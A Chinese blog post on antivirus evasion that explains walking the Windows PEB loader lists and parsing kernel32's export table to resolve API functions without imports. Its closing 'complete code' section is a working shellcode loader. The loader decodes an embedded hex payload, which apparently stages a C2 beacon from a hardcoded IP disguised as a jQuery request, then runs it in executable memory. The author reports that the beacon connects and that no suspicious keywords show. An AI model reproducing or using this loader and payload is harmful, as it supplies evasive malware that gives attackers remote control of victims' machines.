  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

第一个和第二个参数是保留给操作系统内部使用，第三个InMemoryOrderModuleList参数的给出的解释是：“双向链表的头部，包含进程加载的模块。列表中的每一项都是指向LDR_DATA_TABLE_ENTRY结构的指针”

意思就是，InMemoryOrderModuleList是一个LDR_DATA_TABLE_ENTRY类型，且InMemoryOrderModuleList里面包含了已经加载到进程中的模块（pe文件，包括exe和dll等）

而从我们的上面跟进到Ldr的结果来看，这个LDR_DATA_TABLE_ENTRY类型不止InMemoryOrderModuleList这一个

![](https://s3.hedgedoc.org/demo/uploads/d6722832-c8e6-425a-a69d-77d5cbfd064b.png)

以看到，还有其他两个，加起来共下面3个
1. InLoadOrderModuleList
2. InMemoryOrderModuleList
3. InInitializationOrderModuleList
下面我们直接分析第一个InLoadOrderModuleList
偏移为0x00c
地址为[ 0x1034078 - 0x1036e78 ]
类型为LDR_DATA_TABLE_ENTRY

#### B、LDR_DATA_TABLE_ENTRY原型
微软给出的LDR_DATA_TABLE_ENTRY原型：https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data

```C++
typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

#### C、关于双向链表
上面说到InLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList是一个双向链表

我们知道自行车的链条，其实就是又一节一节的链节构成，每一个链节的前端和后端都铆钉连着其他的链节，最后首尾相接。

![](https://s3.hedgedoc.org/demo/uploads/c0eb2de8-2d36-4371-a302-d9c0e7d9f7bd.png)

其实双向链表也是这个结构，只不过用地址连接
1. Flink（Forward Link）指向链表中下一个节点的地址，即下一个加载的模块的 _LDR_DATA_TABLE_ENTRY 结构的地址
2. Blink（Back Link）指向链表中上一个节点的地址，即上一个加载的模块的 _LDR_DATA_TABLE_ENTRY 结构的地址

![](https://s3.hedgedoc.org/demo/uploads/28a2dfde-b8c3-447e-bb66-80ffd4ec56d0.png)

什么，你问Flink和Blink在哪里？
在PEB_LDR_DATA和LDR_DATA_TABLE_ENTRY里面就能看到

![](https://s3.hedgedoc.org/demo/uploads/10610e36-ddf9-4305-86ca-36892c5baeba.png)

![](https://s3.hedgedoc.org/demo/uploads/d9c8424b-f4a6-4c96-9648-3487b8f86d30.png)

### V、分析InLoadOrderModuleList
#### A、第1个InLoadOrderModuleList
在上面分析Ldr我们知道了第1个InLoadOrderModuleList的地址为：0x00824078

![](https://s3.hedgedoc.org/demo/uploads/6992d346-0498-4e40-9e53-bdca42117750.png)

直接跟进到第1个InLoadOrderModuleList的地址

```
dt -r1 0x00824078 _LDR_DATA_TABLE_ENTRY
```

![](https://s3.hedgedoc.org/demo/uploads/cbd33fb2-331f-468a-97c0-97a55c295fbd.png)

由上图所示，我们从第1个InLoadOrderModuleList中得到的信息如下
1. 第2个InLoadOrderModuleList地址为0x00823f60
2. 模块地址（DllBase）为0x009e0000
3. 模块名称（BaseDllName）为ProC.exe

#### B、第2个InLoadOrderModuleList

```
dt -r1 0x00823f60 _LDR_DATA_TABLE_ENTRY
```

![](https://s3.hedgedoc.org/demo/uploads/4cbd3037-a972-496d-b782-1e2e9f158ce1.png)

由上图所示，我们从第2个InLoadOrderModuleList中得到的信息如下
1. 第3个InLoadOrderModuleList地址为0x00824470
2. 模块地址（DllBase）为0x77950000
3. 模块名称（BaseDllName）为ntdll.dll

#### C、第3个InLoadOrderModuleList

```
dt -r1 0x00824470 _LDR_DATA_TABLE_ENTRY
```

![](https://s3.hedgedoc.org/demo/uploads/e298541c-9c7b-4c5b-b1d6-73f1e8589eb5.png)

由上图所示，我们从第3个InLoadOrderModuleList中得到的信息如下
1. 第4个InLoadOrderModuleList地址为0x00824860
2. 模块地址（DllBase）为0x76550000
3. 模块名称（BaseDllName）为KERNEL32.DLL

#### D、第4个InLoadOrderModuleList

```
dt -r1 0x00824860 _LDR_DATA_TABLE_ENTRY
```

![](https://s3.hedgedoc.org/demo/uploads/2cc9ff51-7423-4999-8e7b-1ee4f131a2cd.png)

由上图所示，我们从第4个InLoadOrderModuleList中得到的信息如下
1. 第5个InLoadOrderModuleList地址为0x00825c78
2. 模块地址（DllBase）为0x76820000
3. 模块名称（BaseDllName）为KERNELBASE.dll

第五个
第六个
......
以此类推，便可以知道后面加载的模块地址和名称
不过一个一个得调，有点费眼睛


#### E、小结

从上面的分析来看，在pe文件中模块的加载顺序为：
1. pe文件本体
2. ntdll.dll
3. KERNEL32.DLL
4. KERNELBASE.dll
5. ......
所有的加载的dll地址都是在InLoadOrderModuleList偏移0x000处

### VI、汇编代码
#### A、获取KERNEL32地址-代码1

```C++
#include <Windows.h>
#include <cstdio>

int main() {

	ULONG address;

	__asm {
		mov eax, fs: [0x030]; 进入peb
		mov eax, [eax + 0x00c]; 进入Ldr
		mov eax, [eax + 0x00c]; 进入第一个InLoadOrderModuleList，并获取第2个模块的Flink地址
		mov eax, [eax + 0x000]; 进入第二个InLoadOrderModuleList，并获取第3个模块的Flink地址
		mov eax, [eax + 0x000]; 进入第3个InLoadOrderModuleList，并获取第4个模块的Flink地址
		mov eax, [eax + 0x018]; 从第3个InLoadOrderModuleList中的获取DllBase
		mov address, eax;
	}

	HANDLE kerAddress = LoadLibrary(L"KERNEL32.dll");

	printf("0x%x \n", address);
	printf("0x%x \n", kerAddress);

	return 0;
}
```

![](https://s3.hedgedoc.org/demo/uploads/463fed05-b4ba-4490-8a6d-5a3dd7ff02fb.png)

利用测试

```C++
#include <Windows.h>
#include <cstdio>

int main() {


	ULONG address;

	__asm {
		mov eax, fs: [0x030]; 进入peb
		mov eax, [eax + 0x00c]; 进入Ldr
		mov eax, [eax + 0x00c]; 进入第一个InLoadOrderModuleList，并获取第2个模块的Flink地址
		mov eax, [eax + 0x000]; 进入第二个InLoadOrderModuleList，并获取第3个模块的Flink地址
		mov eax, [eax + 0x000]; 进入第3个InLoadOrderModuleList，并获取第4个模块的Flink地址
		mov eax, [eax + 0x018]; 从第3个InLoadOrderModuleList中的获取DllBase
		mov address, eax;
	}

	typedef void (WINAPI* getTime) (
		LPSYSTEMTIME lpSystemTime
		);
	
	getTime dwGetTime = (getTime)GetProcAddress((HMODULE)address, "GetLocalTime");//利用点
	SYSTEMTIME localTime;
	dwGetTime(&localTime);
	printf("本地时间：%02d/%02d/%d %02d:%02d:%02d\n",
		localTime.wMonth, localTime.wDay, localTime.wYear,
		localTime.wHour, localTime.wMinute, localTime.wSecond);

	return 0;
}
```

![](https://s3.hedgedoc.org/demo/uploads/84bc1226-30cb-40e7-9ba9-ada3250a5133.png)

#### B、获取KERNEL32地址-代码2

```C++
#include <Windows.h>
#include <cstdio>

typedef struct _PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
}UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

void GetKernel32Addr() {
	ULONG address;
	__asm {
		mov eax, fs: [0x030]		// PEB
		mov eax, [eax + 0x00c]		//Ldr
		mov eax, [eax + 0x00c]		//InLoadOrderModuleList
		mov address, eax			//address是InLoadOrderModuleList地址，也是第一个_LDR_DATA_TABLE_ENTRY
	}

	PLIST_ENTRY pHead = (PLIST_ENTRY)address;
	PLIST_ENTRY pFlink = pHead->Flink;

	while (((PLDR_DATA_TABLE_ENTRY)pHead)->BaseDllName.Buffer != ((PLDR_DATA_TABLE_ENTRY)pFlink)->BaseDllName.Buffer) {
		if (((PLDR_DATA_TABLE_ENTRY)pFlink)->DllBase != NULL && _wcsicmp(((PLDR_DATA_TABLE_ENTRY)pFlink)->BaseDllName.Buffer, L"KERNEL32.dll") == 0) {
			printf("%ws	0x%x\n", ((PLDR_DATA_TABLE_ENTRY)pFlink)->BaseDllName.Buffer, ((PLDR_DATA_TABLE_ENTRY)pFlink)->DllBase);
		}
		pFlink = pFlink->Flink;
	}
}

int main() {
	GetKernel32Addr();
	return 0;
}
```

![](https://s3.hedgedoc.org/demo/uploads/ee5ac03f-0aa2-4ffe-be6a-456442439bfd.png)

## 3、从kernel32.dll中寻找GetProcAddress函数
拿dll来说吧，如果你写的一个dll里面的A函数需要被别的exe调用，你就必须得将A函数声明位导出函数
而导出函数自然在导出表里面，可供查询
下面是导出表在PE文件中的位置（倒推）：
1. 导出表（_IMAGE_EXPORT_DIRECTORY）
2. 数据目录表（_IMAGE_DATA_DIRECTORY）
3. 可选映像头（_IMAGE_OPTIONAL_HEADER）
4. NT头（_IMAGE_NT_HEADERS）
5. DOS头（_IMAGE_DOS_HEADER）

![](https://s3.hedgedoc.org/demo/uploads/804ec497-a5a5-429b-9d3d-63ca69caeae8.png)

##
DOS头中（_IMAGE_DOS_HEADER结构体），最后一个参数e_lfanew指向的是NT头（_IMAGE_NT_HEADERS结构）的地址
偏移0x03c

![](https://s3.hedgedoc.org/demo/uploads/c924ea8f-9132-44ab-8bdb-625aeff81575.png)

NT头中（_IMAGE_NT_HEADERS结构），参数OptionalHeader指向的是可选映像头（_IMAGE_OPTIONAL_HEADER结构体）的地址
偏移0x018

![](https://s3.hedgedoc.org/demo/uploads/5a189ce1-1133-4ea4-99e2-c6c7dbbe1ae3.png)

可选映像头（_IMAGE_OPTIONAL_HEADER结构体）中，参数DataDirectory指向的是数据目录表（_IMAGE_DATA_DIRECTORY结构体）的地址
偏移0x060

![](https://s3.hedgedoc.org/demo/uploads/be4a618c-78fd-4149-a9ca-718c3ab4500c.png)

数据目录表（_IMAGE_DATA_DIRECTORY）中，
下面继续用Windbg看看咋找kernel32.dll的导出表

### I、KERNEL32.dll地址
tips：后面因为重启了电脑，KERNEL32.dll的地址就发生了变化（0x76f20000）
首先，找到了KERNEL32.DLL的地址为0x76f20000

![](https://s3.hedgedoc.org/demo/uploads/6ddd2222-975c-4f7d-8ff3-eb22079af4ad.png)

然后我们查看KERNEL32.dll的DOS头

### II、KERNEL32.dll DOS头地址

```
dt -r1 0x76f20000 _IMAGE_DOS_HEADER
```

![](https://s3.hedgedoc.org/demo/uploads/8b7a0e15-2b77-4734-a291-4bc5e240f3b3.png)

NT头（_IMAGE_NT_HEADERS）偏移在0x03c

### III、KERNEL32.dll NT头地址

```
dt -r1 76f20000+0x03c _IMAGE_NT_HEADERS
```

![](https://s3.hedgedoc.org/demo/uploads/77efed12-1cb8-496f-a165-5d16240515c9.png)

可选映像头（_IMAGE_OPTIONAL_HEADER）在偏移0x018

### IV、KERNEL32.dl 可选映像头

```
dt -r1 76f20000+0x03c+0x018 _IMAGE_OPTIONAL_HEADER
```

![](https://s3.hedgedoc.org/demo/uploads/a813265e-9959-46ae-8648-3559ba33566f.png)

数据目录表（_IMAGE_DATA_DIRECTORY）在偏移0x060处

### V、KERNEL32.dl 数据目录表

```
dt -r1 76f20000+0x03c+0x018+0x060 _IMAGE_DATA_DIRECTORY
```

![](https://s3.hedgedoc.org/demo/uploads/483df9ea-29cc-4191-aa12-142f3eca634a.png)

在IMAGE_DATA_DIRECTORY这个结构体中，只有VirtualAddress和Size两个成员
这两个成员的含义比较简单
1. VirtualAddress指定了数据块的相对虚拟地址(RVA)
2. Size指定了该数据块的大小。
其中共有16项成员，具体如下：
```
导出表（Export Table）
导入表（Import Table）
资源表（Resource Table）
异常处理表（Exception Table）
安全相关表（Certificate Table）
重定位表（Base Relocation Table）
调试信息表（Debugging Information Table）
版权信息表（Architecture-Specific Data Table）
全局指针寄存器表（Global Pointer Register Table）
TLS表（Thread Local Storage Table）
负载配置表（Load Configuration Table）
网络地址转换表（Bound Import Table）
导出地址表（Import Address Table）
延迟加载导入表（Delay Import Table）
COM运行时描述表（COM Runtime Descriptor Table）
保留（Reserved）
```

其中导入表，导出表，重定位表，IAT表等等表比较重要
而我们的导出表就在第1个位置
但是呢，这里记录的是导出表的RVA（相对虚拟地址），所以我们要转化成FOA（文件偏移地址）才能在PE文件中查看
FOA == RVA - BaseRVA + BaseFOA
1. RVA 是要转化的相对虚拟地址。
2. BaseRVA 是数据目录表中导出表项的RVA。
3. BaseFOA 是数据目录表中导出表项的FOA。

```C++
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;				//所有的导出函数的个数
    DWORD   NumberOfNames;						//有名字的函数个数
    DWORD   AddressOfFunctions;				//导出函数地址表的RVA
    DWORD   AddressOfNames;						//导出函数名称表的RVA
    DWORD   AddressOfNameOrdinals;  	//导出函数序号表的RVA

} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

```C++
#include <Windows.h>
#include <cstdio>


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
}UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

ULONG getDllName() {
	ULONG address;
	__asm {
		mov eax, fs: [0x030] // 进入PEB
		mov eax, [eax + 0x00c] // 进入Ldr
		mov eax, [eax + 0x00c] // 进入第一个InLoadOrderModuleList
		mov address, eax
	}
	PLDR_DATA_TABLE_ENTRY Flink = (PLDR_DATA_TABLE_ENTRY)address;

	PLIST_ENTRY ModuleList = (PLIST_ENTRY)Flink;
	PLIST_ENTRY tou = ModuleList->Flink;
	PLIST_ENTRY wei = ModuleList->Blink;
	while (tou != wei) {
		PLDR_DATA_TABLE_ENTRY Flink1 = (PLDR_DATA_TABLE_ENTRY)tou;
		ULONG dllBase = (ULONG)Flink1->DllBase;
		PWSTR dllName = Flink1->BaseDllName.Buffer;
		if (wcscmp(dllName, L"KERNEL32.DLL") == 0) {
			return dllBase;
		}
		tou = tou->Flink;
	}

	return -1;
}

ULONG getFunAddress() {
	ULONG KERNEL32 = getDllName();
	PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)KERNEL32; // 获取KERNEL32.DLL的DOS头
	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(KERNEL32 + pDOS->e_lfanew); // 获取KERNEL32.DLL的NT头
	PIMAGE_OPTIONAL_HEADER pOPTIONAL = (PIMAGE_OPTIONAL_HEADER)(&pNT->OptionalHeader); // 获取KERNEL32.DLL的可选映像头
	PIMAGE_DATA_DIRECTORY pDATA = (PIMAGE_DATA_DIRECTORY)pOPTIONAL->DataDirectory; // 获取KERNEL32.DLL的数据目录表
	PIMAGE_DATA_DIRECTORY pEXPORT_TABLE = &pDATA[0]; // 获取KERNEL32.DLL的导出表地址
	DWORD offset = pEXPORT_TABLE->VirtualAddress; // 获取偏移地址

	PIMAGE_EXPORT_DIRECTORY pEXPORT_TABLE_INFO = (PIMAGE_EXPORT_DIRECTORY)(KERNEL32 + offset);
	DWORD funCount = pEXPORT_TABLE_INFO->NumberOfFunctions; // 获取导出表中的函数数量
	PDWORD  pEXPORT_ADDRESS_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfFunctions); //获取导出地址表
	PDWORD  pEXPORT_NAME_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNames); //获取导出名称表
	PWORD pEXPORT_XH_TABLE = (PWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNameOrdinals); //获取导出序号表


	for (DWORD i = 0; i < funCount; i++) {
		if (!pEXPORT_ADDRESS_TABLE[i]) {
			continue;
		}
		DWORD XH = pEXPORT_TABLE_INFO->Base + i; //获取函数序号
		DWORD funAddrOffset = pEXPORT_ADDRESS_TABLE[i]; // 获取函数偏移地址

		for (DWORD j = 0; j < funCount; j++) {
			if (pEXPORT_XH_TABLE[j] == i) {
				ULONG funNameOffset = pEXPORT_NAME_TABLE[j];
				char* funName = (char*)(KERNEL32 + funNameOffset);
				if (strcmp(funName, "GetProcAddress") == 0) {
					printf("%s          0x%x\n", funName, (KERNEL32 + funAddrOffset));
					return KERNEL32 + funAddrOffset;
				}
			}
		}
	}
}


int main() {
	getFunAddress();
	return 0;
}
```

## 4、完整代码
### I、头文件 source.h
```C++
#pragma once
#include <Windows.h>
#include <cstdio>


typedef NTSTATUS(WINAPI* MyRtlAdjustPrivilege)(
	ULONG    Privilege,
	BOOLEAN  Enable,
	BOOLEAN  CurrentThread,
	PBOOLEAN Enabled
	);

typedef HRSRC(WINAPI* MyFindResource)(
	HMODULE hModule,   // 包含资源的模块的句柄
	LPCWSTR lpName,    // 资源的名称
	LPCWSTR lpType     // 资源的类型
	);

typedef DWORD(WINAPI* MySizeofResource)(
	HMODULE hModule,
	HRSRC hResInfo
	);

typedef HGLOBAL(WINAPI* MyLoadResource)(
	HMODULE hModule,
	HRSRC hResInfo
	);

typedef LPVOID(WINAPI* MyVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef BOOL(WINAPI* MyVirtualFree)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  dwFreeType
	);

typedef HANDLE(WINAPI* MyCreateThread)(
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
	);

typedef DWORD(WINAPI* MyWaitForSingleObject)(
	HANDLE hHandle,
	DWORD dwMilliseconds
	);

typedef HMODULE(WINAPI* MyLoadLibraryA)(
	LPCSTR lpFileName  // DLL 文件的路径或名称
	);

typedef HMODULE(WINAPI* MyGetModuleHandleA)(
	LPCSTR lpFileName  // DLL 文件的路径或名称
	);

typedef int(WINAPI* MyMessageBoxA)(
	HWND    hWnd,
	LPCSTR lpText,
	LPCSTR lpCaption,
	UINT    uType
	);

typedef ULONG(WINAPI* MyGetProcAddress)(
	HMODULE hModule,    // 包含导出函数的 DLL 模块的句柄
	LPCSTR  lpProcName  // 要获取的函数的名称
	);





typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
}UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

ULONG getKERNEL32() {
	ULONG address;
	__asm {
		mov eax, fs: [0x030] // 进入PEB
		mov eax, [eax + 0x00c] // 进入Ldr
		mov eax, [eax + 0x00c] // 进入第一个InLoadOrderModuleList
		mov address, eax
	}
	PLDR_DATA_TABLE_ENTRY Flink = (PLDR_DATA_TABLE_ENTRY)address;

	PLIST_ENTRY ModuleList = (PLIST_ENTRY)Flink;
	PLIST_ENTRY tou = ModuleList->Flink;
	PLIST_ENTRY wei = ModuleList->Blink;
	while (tou != wei) {
		PLDR_DATA_TABLE_ENTRY Flink1 = (PLDR_DATA_TABLE_ENTRY)tou;
		ULONG dllBase = (ULONG)Flink1->DllBase;
		PWSTR dllName = Flink1->BaseDllName.Buffer;
		if (wcscmp(dllName, L"KERNEL32.DLL") == 0) {
			return dllBase;
		}
		tou = tou->Flink;
	}

	return -1;
}

ULONG getFunAddr() {
	ULONG KERNEL32 = getKERNEL32();
	PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)KERNEL32; // 获取KERNEL32.DLL的DOS头
	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(KERNEL32 + pDOS->e_lfanew); // 获取KERNEL32.DLL的NT头
	PIMAGE_OPTIONAL_HEADER pOPTIONAL = (PIMAGE_OPTIONAL_HEADER)(&pNT->OptionalHeader); // 获取KERNEL32.DLL的可选映像头
	PIMAGE_DATA_DIRECTORY pDATA = (PIMAGE_DATA_DIRECTORY)pOPTIONAL->DataDirectory; // 获取KERNEL32.DLL的数据目录表
	PIMAGE_DATA_DIRECTORY pEXPORT_TABLE = &pDATA[0]; // 获取KERNEL32.DLL的导出表地址
	DWORD offset = pEXPORT_TABLE->VirtualAddress; // 获取偏移地址

	PIMAGE_EXPORT_DIRECTORY pEXPORT_TABLE_INFO = (PIMAGE_EXPORT_DIRECTORY)(KERNEL32 + offset);
	DWORD funCount = pEXPORT_TABLE_INFO->NumberOfFunctions; // 获取导出表中的函数数量
	PDWORD  pEXPORT_ADDRESS_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfFunctions); //获取导出地址表
	PDWORD  pEXPORT_NAME_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNames); //获取导出名称表
	PWORD pEXPORT_XH_TABLE = (PWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNameOrdinals); //获取导出序号表


	for (DWORD i = 0; i < funCount; i++) {
		if (!pEXPORT_ADDRESS_TABLE[i]) {
			continue;
		}
		DWORD XH = pEXPORT_TABLE_INFO->Base + i; //获取函数序号
		DWORD funAddrOffset = pEXPORT_ADDRESS_TABLE[i]; // 获取函数偏移地址

		for (DWORD j = 0; j < funCount; j++) {
			if (pEXPORT_XH_TABLE[j] == i) {
				ULONG funNameOffset = pEXPORT_NAME_TABLE[j];
				char* funName = (char*)(KERNEL32 + funNameOffset);
				if (strcmp(funName, "GetProcAddress") == 0) {
					//printf("%s          0x%x\n", funName, (KERNEL32 + funAddrOffset));
					ULONG FunBase = KERNEL32 + funAddrOffset;
					return FunBase;
				}
			}
		}
	}
	return 0;
}
```
### II、调用代码
```C++
#include <cstdlib>
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include "source.h"
#include "resource.h"
#include <vector>
#include <string>



void test() {
	HMODULE KERNEL32 = (HMODULE)getKERNEL32();
	MyGetProcAddress pMyGetProcAddress = (MyGetProcAddress)getFunAddr();
	MyLoadLibraryA pMyLoadLibrary = (MyLoadLibraryA)pMyGetProcAddress(KERNEL32, "LoadLibraryA");

	HMODULE USER32 = (HMODULE)pMyLoadLibrary("user32.dll");
	MyMessageBoxA pMessageBox = (MyMessageBoxA)pMyGetProcAddress(USER32, "MessageBoxA");
	pMessageBox(NULL, "SUCCESS!", "FROM LANZ", MB_ICONINFORMATION | MB_OK);
}


void runn() {
	HMODULE KERNEL32 = (HMODULE)getKERNEL32();
	MyGetProcAddress pMyGetProcAddress = (MyGetProcAddress)getFunAddr();
	MyVirtualAlloc pMyVirtualAlloc = (MyVirtualAlloc)pMyGetProcAddress(KERNEL32, "VirtualAlloc");
	MyVirtualFree pMyVirtualFree = (MyVirtualFree)pMyGetProcAddress(KERNEL32, "VirtualFree");
	MyCreateThread pMyCreateThread = (MyCreateThread)pMyGetProcAddress(KERNEL32, "CreateThread");
	MyWaitForSingleObject pMyWaitForSingleObject = (MyWaitForSingleObject)pMyGetProcAddress(KERNEL32, "WaitForSingleObject");

	char nox_shellcode[] = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd531ff5757575757683a5679a7ffd5e9840000005b31c951516a03515168525b000053506857899fc6ffd5eb705b31d252680002408452525253525068eb552e3bffd589c683c35031ff57576aff5356682d06187bffd585c00f84c301000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c774b731ffe991010000e9c9010000e88bffffff2f6a71756572792d332e332e312e736c696d2e6d696e2e6a7300fc02f2b21bb91f569a79261e89f6aa6d30335ca68153ec96d769bbc3a2825e891f7a38a831a42977456e6281ee503f86b14bed70d6004163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a526566657265723a20687474703a2f2f636f64652e6a71756572792e636f6d2f0d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e5420362e333b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f0d0a00f2acb17007540dfd1504d1f8a7fd67391345854bacd9149ccf35eb37a590993ae6f80f70663c6dec2eea276c69d4ef9786b27be52cf37d0068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b9af0f000001d9515389e7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e8a9fdffff3131372e36382e3130312e33300005f5e100";
	std::vector<char> shellcode;  // 初始化为全零，用于存储转义序列形式

	// 将每两个字符转换为对应的 ASCII 字符
	for (size_t i = 0; i < strlen(nox_shellcode); i += 2) {
		std::string hex = std::string(nox_shellcode + i, 2); //每次取两个字符，即1个16位进制数
		int num = std::stoi(hex, nullptr, 16); //将16位进制数转化为10进制整数
		char ch = static_cast<char>(num); //将10进制整数转化为对应的字符
		shellcode.push_back(ch); //将字符添加到mem数组中
	}

	LPVOID mem = pMyVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(mem, shellcode.data(), shellcode.size());
	HANDLE hThread = pMyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
	pMyWaitForSingleObject(hThread, -1);

	pMyVirtualFree(mem, 0, MEM_RELEASE);

}

int main() {
	runn();
	return 0;
}

```

正常上线

![](https://s3.hedgedoc.org/demo/uploads/854803b5-ed33-4757-97a4-01cbc61acc8c.png)

没有任何的关键字

![](https://s3.hedgedoc.org/demo/uploads/56f0fc20-c6d2-4989-abf5-92bb7b1dc24d.png)

## 5、学习
https://mdnice.com/writing/4d0ae898afe64ad2b7d68af175971729
https://cloud.tencent.com/developer/article/2337995

















]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
</search>
